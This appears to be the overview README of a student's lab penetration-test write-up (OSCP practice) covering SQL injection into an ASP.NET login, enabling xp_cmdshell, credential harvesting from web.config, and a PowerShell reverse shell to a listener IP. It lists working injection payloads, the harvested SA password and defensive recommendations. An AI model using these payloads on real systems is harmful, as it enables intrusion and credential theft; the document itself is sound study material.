# OFFSECATK.COM - Complete Penetration Test Documentation

**Target:** http://offsecatk.com (192.168.145.50)
**Assessment Date:** 2025-10-03
**Tester:** OSCP Student
**Status:** ✅ COMPROMISED

---

## EXECUTIVE SUMMARY

This directory contains comprehensive documentation of the successful penetration test against offsecatk.com, a Windows Server 2022 system running an ASP.NET web application backed by Microsoft SQL Server.

**Critical Finding:** SQL injection vulnerability in login form led to full system compromise via command execution, credential harvesting, and reverse shell establishment.

**Time to Compromise:** ~21 minutes (enumeration to flag extraction)

---

## DOCUMENTATION FILES

### 📋 [enumeration.md](enumeration.md) - 15KB
**Complete reconnaissance and discovery phase**

**Contents:**
- Initial web application fingerprinting
- SQL injection discovery and confirmation
- Database structure enumeration
- Operating system reconnaissance
- Credential harvesting from web.config
- Flag file discovery

**Key Findings:**
- MSSQL Server 2019 backend
- Stacked queries enabled
- Application connects as `sa` (sysadmin)
- Web root writable by SQL service account
- SA password: `WhileChirpTuesday218`

**Time Documented:** ~21 minutes of enumeration

---

### 🎯 [breakthrough.md](breakthrough.md) - 13KB
**The critical vulnerability that enabled full compromise**

**Contents:**
- Discovery of stacked query support
- xp_cmdshell enablement technique
- Why the attack succeeded
- Alternative exploitation paths
- Dependencies and prerequisites
- Pattern recognition for similar targets

**The Key Insight:**
Stacked queries + sysadmin privileges = complete control via xp_cmdshell

**Critical Factor:**
Application connecting to database as `sa` (system administrator) made this attack possible.

---

### 💣 [exploitation.md](exploitation.md) - 19KB
**Step-by-step exploitation from SQLi to reverse shell**

**Contents:**
- SQL injection validation
- xp_cmdshell enablement commands
- Command execution verification
- System reconnaissance via xp_cmdshell
- Credential extraction from web.config
- Flag extraction technique
- PowerShell reverse shell payload
- Complete attack chain documentation

**Exploitation Chain:**
```
SQL Injection
    → Stacked Queries
        → Enable xp_cmdshell
            → OS Command Execution
                → Credential Harvesting
                    → Flag Extraction
                        → Reverse Shell
```

**Time to Exploit:** ~13 minutes

---

### 🔬 [vulnerability_research.md](vulnerability.md) - 21KB
**Manual discovery techniques and security research**

**Contents:**
- SQL injection manual discovery methodology
- Database fingerprinting techniques
- MSSQL exploitation research
- xp_cmdshell alternatives (OLE, Agent Jobs, CLR)
- ASP.NET security vulnerabilities
- Credential harvesting locations
- PowerShell reverse shell analysis
- Detection and prevention mechanisms

**Educational Value:**
- How to find SQL injection WITHOUT tools
- Why each technique works
- When to use alternative methods
- How defenders detect these attacks

---

## ATTACK SUMMARY

### Vulnerability Chain

| Phase | Vulnerability | Impact |
|-------|--------------|--------|
| 1. Initial Access | SQL Injection | Database access |
| 2. Privilege Context | Application uses SA account | Full DB control |
| 3. Configuration | Stacked queries enabled | Arbitrary SQL execution |
| 4. RCE | xp_cmdshell enablement | OS command execution |
| 5. Credential Theft | Plaintext creds in web.config | SA password harvested |
| 6. Persistence | PowerShell reverse shell | Interactive system access |

---

## KEY STATISTICS

**Enumeration:**
- Time: 21 minutes
- Tools: crack-toolkit, sqlmap, curl
- Findings: 1 critical SQLi, 1 credential exposure

**Exploitation:**
- Time: 13 minutes
- Techniques: Stacked queries, xp_cmdshell, PowerShell
- Access Level: SQL service account (nt service\mssql$sqlexpress)

**Credentials Harvested:**
- SA account: `sa:WhileChirpTuesday218`
- Connection string: Full database access

**Flags Captured:**
- `OS{a69ff8bdaaf5e6886b8abe89638375c8}`

**Shell Access:**
- Type: PowerShell reverse shell
- Listener: 192.168.45.179:4444
- Connection: 192.168.145.50:57894
- Status: ✅ Active

---

## COMMANDS REFERENCE

### Quick Command Summary

**SQL Injection Test:**
```bash
curl -X POST http://offsecatk.com/login.aspx \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox='" \
  [other POST fields]
```

**Enable xp_cmdshell:**
```sql
admin'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
```

**Execute Command:**
```sql
admin'; EXEC xp_cmdshell 'whoami > C:\\inetpub\\wwwroot\\out.txt';--
```

**Extract Flag:**
```sql
admin'; EXEC xp_cmdshell 'type C:\\inetpub\\wwwroot\\flag.txt > C:\\inetpub\\wwwroot\\flag_out.txt';--
```

**Reverse Shell:**
```sql
admin'; EXEC xp_cmdshell 'powershell -e [BASE64_PAYLOAD]';--
```

---

## TARGET INFORMATION

### System Details
```
Hostname: WINSERV22-TEMP
OS: Windows Server 2022 Standard (Build 20348)
Architecture: x64
IP: 192.168.145.50
Domain: WORKGROUP (standalone)
Memory: 4GB
```

### Application Stack
```
Web Server: Microsoft IIS 10.0
Framework: ASP.NET 4.0.30319
Database: Microsoft SQL Server 2019 (SQLEXPRESS)
```

### User Accounts
```
Administrator (enabled)
DefaultAccount
Guest
WDAGUtilityAccount
```

---

## OSCP EXAM RELEVANCE

### Skills Demonstrated

✅ **Manual Vulnerability Discovery**
- SQL injection identification without automated tools
- Database fingerprinting
- Stacked query detection

✅ **MSSQL Exploitation**
- xp_cmdshell enablement
- Command execution via SQL injection
- Output exfiltration techniques

✅ **Credential Harvesting**
- Web.config extraction
- Configuration file analysis
- Password identification

✅ **Reverse Shell Establishment**
- PowerShell payload creation
- Base64 encoding
- Network listener configuration

✅ **Documentation**
- Comprehensive enumeration notes
- Step-by-step exploitation guide
- Manual technique explanation

---

## EXAM PREPARATION NOTES

### Time Management
- SQL injection to RCE: 5-10 minutes
- Credential harvesting: 5 minutes
- Flag extraction: 3 minutes
- Reverse shell: 5 minutes
- **Total: ~20-25 minutes per box**

### Common Pitfalls to Avoid
- ❌ Forgetting to include ViewState in POST requests
- ❌ Not testing for stacked queries
- ❌ Skipping web.config extraction
- ❌ Using incorrect encoding for PowerShell payloads
- ❌ Not documenting all steps for report

### Techniques to Master
1. Manual SQL injection testing (no SQLMap initially)
2. xp_cmdshell enablement sequence
3. Output redirection to web root
4. PowerShell reverse shell encoding
5. Systematic credential harvesting

---

## FILES CREATED ON TARGET (CLEANUP REQUIRED)

**Web Root Files:**
```
C:\inetpub\wwwroot\out.txt          (whoami output)
C:\inetpub\wwwroot\sysinfo.txt      (systeminfo output)
C:\inetpub\wwwroot\users.txt        (net user output)
C:\inetpub\wwwroot\webconfig.txt    (web.config copy)
C:\inetpub\wwwroot\flags.txt        (file search results)
C:\inetpub\wwwroot\flag_out.txt     (flag contents)
```

**Cleanup Command:**
```sql
EXEC xp_cmdshell 'del C:\inetpub\wwwroot\out.txt';
EXEC xp_cmdshell 'del C:\inetpub\wwwroot\sysinfo.txt';
EXEC xp_cmdshell 'del C:\inetpub\wwwroot\users.txt';
EXEC xp_cmdshell 'del C:\inetpub\wwwroot\webconfig.txt';
EXEC xp_cmdshell 'del C:\inetpub\wwwroot\flags.txt';
EXEC xp_cmdshell 'del C:\inetpub\wwwroot\flag_out.txt';
```

---

## ALTERNATIVE EXPLOITATION METHODS

If primary method fails, try:

1. **OLE Automation** (if xp_cmdshell can't be enabled)
2. **SQL Server Agent Jobs** (scheduled task execution)
3. **CLR Assembly Loading** (custom .NET code)
4. **OPENROWSET** (file system access)
5. **Bulk Insert** (file reading)

See [vulnerability_research.md](vulnerability_research.md) for detailed alternatives.

---

## DEFENSIVE RECOMMENDATIONS

### Immediate Actions (Critical)
1. **Disable xp_cmdshell permanently**
2. **Revoke SA privileges from application**
3. **Implement parameterized queries**
4. **Restrict web.config file system permissions**
5. **Change SA password immediately**

### Long-Term Improvements
1. Deploy Web Application Firewall (WAF)
2. Implement least-privilege database accounts
3. Enable SQL query auditing
4. Deploy endpoint detection and response (EDR)
5. Network segmentation (DB tier isolation)
6. Regular security assessments

---

## LEARNING OUTCOMES

### What Worked Well
✅ Systematic enumeration revealed all necessary information
✅ Manual techniques understood before tool usage
✅ Multiple exfiltration methods documented
✅ Complete attack chain reproducible
✅ Comprehensive documentation created

### What Could Be Improved
- Could have tested for Blind SQLi earlier
- Could have checked for other injection points
- Could have enumerated more user directories
- Could have attempted privilege escalation to SYSTEM

### Key Takeaways
1. **Always test web.config on ASP.NET apps**
2. **Stacked queries = significant privilege escalation**
3. **SA account usage = critical misconfiguration**
4. **PowerShell reverse shells are effective**
5. **Documentation is as important as exploitation**

---

## DOCUMENTATION STRUCTURE

```
offsecatk_com/
├── README.md                      (This file - Overview)
├── enumeration.md                 (Discovery phase)
├── breakthrough.md                (Critical vulnerability)
├── exploitation.md                (Attack execution)
└── vulnerability_research.md      (Manual techniques & research)
```

**Total Documentation:** 68KB across 5 files

---

## QUICK REFERENCE

**Target IP:** 192.168.145.50
**Attacker IP:** 192.168.45.179
**Vulnerable Endpoint:** http://offsecatk.com/login.aspx
**Injection Parameter:** `ctl00$ContentPlaceHolder1$UsernameTextBox`
**Database:** webapp (MSSQL 2019)
**Credentials:** sa:WhileChirpTuesday218
**Flag:** OS{a69ff8bdaaf5e6886b8abe89638375c8}
**Shell:** PowerShell reverse on port 4444

---

## EXAM REPORT SECTIONS

This documentation provides all content needed for:

1. **Executive Summary** → Use attack summary
2. **Methodology** → Reference enumeration.md
3. **Vulnerability Details** → Use breakthrough.md
4. **Exploitation** → Reference exploitation.md
5. **Post-Exploitation** → Credential harvesting + shell
6. **Recommendations** → Defensive recommendations section
7. **Appendix** → Commands and technical details

---

## CONCLUSION

This comprehensive documentation demonstrates:
- **Complete understanding** of SQL injection exploitation
- **Manual discovery techniques** without reliance on automated tools
- **MSSQL-specific** privilege escalation paths
- **Professional documentation** suitable for client reporting
- **OSCP-relevant skills** in enumeration, exploitation, and reporting

**Status:** Target fully compromised, flag captured, persistent access established, all steps documented for replication and learning.

---

**Next Steps:**
1. Review all documentation files
2. Practice manual replication without notes
3. Create flashcards for key commands
4. Test alternative methods on similar boxes
5. Time yourself for exam preparation

**Estimated Study Time:** 2-3 hours to master all techniques documented here.
